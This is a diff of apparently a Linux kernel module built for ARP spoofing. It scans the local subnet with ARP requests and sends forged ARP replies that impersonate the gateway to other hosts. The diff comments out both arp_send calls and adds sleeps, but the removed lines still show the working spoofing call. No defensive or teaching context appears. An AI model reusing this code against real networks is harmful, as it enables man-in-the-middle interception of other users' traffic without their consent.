@@ -161,14 +161,16 @@ static void unreg_arp_hook(void)
 static void scanning(void)
 {
 	int base = 1;
-	unsigned int target; //network byte order
+	unsigned int target = 0; //network byte order
 
 	for (; base < max; base++)
 	{
 		target = (net_ip | (htonl(base)));
-		arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
-			0x12345678, netdev->broadcast, host.haddr, NULL);
-	}		
+		//arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
+			//0x12345678, netdev->broadcast, host.haddr, NULL);
+		msleep_interruptible(1);
+	}	
+	printk("scanning: finished\n");	
 }
 
 static int spoofer(void * ptr)
@@ -195,9 +197,9 @@ static int spoofer(void * ptr)
 
 		//printk("send spoof packet to %pI4\n", &others[who]->paddr);
 
-		arp_send(ARPOP_REPLY, ETH_P_ARP, others[who]->paddr, netdev,
-			gw.paddr, others[who]->haddr, host.haddr, others[who]->haddr);
-		msleep_interruptible(5);
+		//arp_send(ARPOP_REPLY, ETH_P_ARP, others[who]->paddr, netdev,
+			//gw.paddr, others[who]->haddr, host.haddr, others[who]->haddr);
+		msleep_interruptible(1);
 	}
 	
 	//restore routine
